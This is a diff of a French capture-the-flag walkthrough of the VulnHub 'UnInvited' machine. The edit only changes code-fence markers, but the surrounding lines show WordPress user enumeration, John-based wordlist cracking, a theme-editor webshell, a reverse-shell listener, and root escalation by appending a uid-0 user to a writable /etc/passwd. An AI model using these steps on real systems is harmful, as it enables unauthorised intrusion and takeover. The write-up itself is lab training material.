@@ -8,7 +8,7 @@ Ouais c'est ça, ouais !
 
 Après [Ganana]({% link _posts/2022-02-04-Solution-du-CTF-Ganana-de-VulnHub.md %}), je me suis penché sur un autre CTF de [Jeevana Chandra](https://jeevanachandra.github.io/) : [UnInvited](https://www.vulnhub.com/entry/uninvited-1,523/). L'objectif annoncé est de récupérer 3 flags sur la VM.  
 
-```plain
+```
 $ sudo nmap -sCV -T5 -p- 192.168.56.22 
 [sudo] Mot de passe de root :  
 Starting Nmap 7.92 ( https://nmap.org )
@@ -46,7 +46,7 @@ En me rendant sur le port 60000 il ne fait aucun doute que la précédente recom
 
 On peut avoir recours à *wpscan* pour obtenir la liste des utilisateurs du Wordpress mais ici *Nuclei* fait aussi bien l'affaire :  
 
-```plain
+```
 [2022-02-04 11:44:49] [apache-detect] [http] [info] http://fieldforce:60000/ [Apache/2.4.38 (Debian)] 
 [2022-02-04 11:44:52] [wordpress-rdf-user-enum] [http] [info] http://fieldforce:60000/feed/rdf [Elliot] 
 [2022-02-04 11:45:10] [wordpress-xmlrpc-listmethods] [http] [info] http://fieldforce:60000/xmlrpc.php 
@@ -73,13 +73,13 @@ Cela nous permet d'avoir le nom *White Rose* dans la liste.
 
 2. Utiliser la règle *multiword* de John :  
 
-```plain
+```
 john --rules=multiword --wordlist=elliot.txt --stdout | sort | uniq > words.txt
 ```
 
 Ce qui permet d'avoir des entrées comme :  
 
-```plain
+```
 white rose
 whiterose
 White rose
@@ -89,7 +89,7 @@ WhiteRose
 
 3. Utiliser la règle *dive* de John car elle remplace des lettres en chiffres :  
 
-```plain
+```
 john --rules=dive --wordlist=words.txt --stdout > wordlist.txt
 ```
 
@@ -108,7 +108,7 @@ Une fois qu'on a le sésame ça va plus vite. On se connecte au dashboard Wordpr
 
 Dans le *Theme Editor* on tente d'éditer un fichier PHP d'un des thèmes (ça fonctionne avec le thème *Twenty Nineteen*) ce qui nous permet d'avoir un webshell à cette adresse (par exemple) :  
 
-```plain
+```
 http://fieldforce:60000/wp-content/themes/twentynineteen/404.php?cmd=id
 ```
 
@@ -116,7 +116,7 @@ On se retrouve sur une machine avec l'IP 172.18.0.3 et un *.dockerenv* à la rac
 
 On remarque un utilisateur qui a les fichiers suivants :  
 
-```plain
+```
   4849924      4 -rw-r--r--   1 demodocker demodocker       57 Jul 29  2020 /home/demodocker/.local/note.txt 
   4851206      4 -r--------   1 demodocker demodocker      267 Jul 28  2020 /home/demodocker/user2.txt 
   4849906      4 -r--------   1 demodocker demodocker      283 Jul 29  2020 /home/demodocker/.justanotherday
@@ -130,7 +130,7 @@ En regardant le fichier avec un éditeur hexadécimal on voit des références �
 
 J'ai eu recours à [PyInstaller Extractor](https://github.com/extremecoders-re/pyinstxtractor), le bien nommé :  
 
-```plain
+```
 $ python3 pyinstxtractor.py fsociety.exe  
 [+] Processing fsociety.exe 
 [+] Pyinstaller version: 2.1+ 
@@ -152,7 +152,7 @@ En théorie oui, une fois l'extraction passée, la décompilation ne devrait pas
 
 Pas bien grave, on peut faire un *strings* sur le fichier pyc obtenu :  
 
-```plain
+```
 WELCOME TO BACKDOORt 
 -------------------s 
 +++++++++++++++++++s 
@@ -183,7 +183,7 @@ passwordt
 
 Ok donc une machine doit tenter d'établir un reverse shell sur les adresses mentionnées. Nous on est actuellement sur 172.18.0.3 donc il faut rapatrier [un Ncat static](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat) puis écouter sur le port 8888 :  
 
-```plain
+```
 $ ncat -v -l -p 8888 
 Ncat: Version 6.49BETA1 ( http://nmap.org/ncat ) 
 Ncat: Listening on :::8888 
@@ -223,7 +223,7 @@ La machine sur laquelle on récupère ce shell dispose de nombreuses interfaces 
 
 Avec la commande *crontab -l* on retrouve les deux scripts chargés des reverse shells :  
 
-```plain
+```
 * * * * * /usr/bin/python3 /home/docksec/.secret/c1.py 
 * * * * * /usr/bin/python3 /home/docksec/.secret/c2.py
 ```
@@ -233,7 +233,7 @@ net user /add
 
 [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) détecte que le fichier */etc/passwd* est modifiable par tous. Je vais utiliser *mkpasswd* pour avoir un hash correspondant à *toto* :  
 
-```plain
+```
 mkpasswd -m sha512crypt 
 Mot de passe :  
 $6$oCOSAsIhXC.RkvLT$G2KwJNB1m.WM6s2uAF6nmk/Xaas.AAUmUnJHftUkLhrNRSSRNk7PcePrEDucWX92nKKPb4JYnxqm.Jxdr7AGC.
@@ -241,13 +241,13 @@ $6$oCOSAsIhXC.RkvLT$G2KwJNB1m.WM6s2uAF6nmk/Xaas.AAUmUnJHftUkLhrNRSSRNk7PcePrEDuc
 
 Je rajoute alors cette ligne au fichier :  
 
-```plain
+```
 toor:$6$oCOSAsIhXC.RkvLT$G2KwJNB1m.WM6s2uAF6nmk/Xaas.AAUmUnJHftUkLhrNRSSRNk7PcePrEDucWX92nKKPb4JYnxqm.Jxdr7AGC.:0:0:toor:/root:/bin/bash
 ```
 
 Et c'est gagné :  
 
-```plain
+```
 $ su toor 
 Password:  
 root@uninvited:/home/docksec# id 
@@ -266,7 +266,7 @@ FLAG{58DSFJ74RFWESD8J2LKJGHJ87ER4QREWRFLMSTDCMGKAASD}
 
 Il ne nous reste plus qu'à accéder au fichier *user2.txt* qui était dans le dossier de l'utilisateur *demodocker* avec des permissions limitées :  
 
-```plain
+```
 root@uninvited:~# docker ps 
 CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                   NAMES 
 f950b9c50e1d        wordpress:latest    "docker-entrypoint.s…"   18 months ago       Up 29 hours         0.0.0.0:60000->80/tcp   wordpress_wordpress_1_dd9b95034d3d 
